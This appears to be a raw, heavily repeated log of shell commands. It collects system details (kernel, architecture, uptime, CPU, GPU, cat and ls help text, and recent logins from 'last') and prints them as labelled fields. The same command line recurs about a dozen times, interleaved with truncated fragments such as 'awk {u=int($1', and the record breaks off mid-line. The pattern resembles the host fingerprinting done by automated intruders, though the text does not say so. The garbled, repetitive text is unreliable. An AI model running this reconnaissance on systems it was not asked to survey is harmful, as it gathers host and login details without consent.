gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut 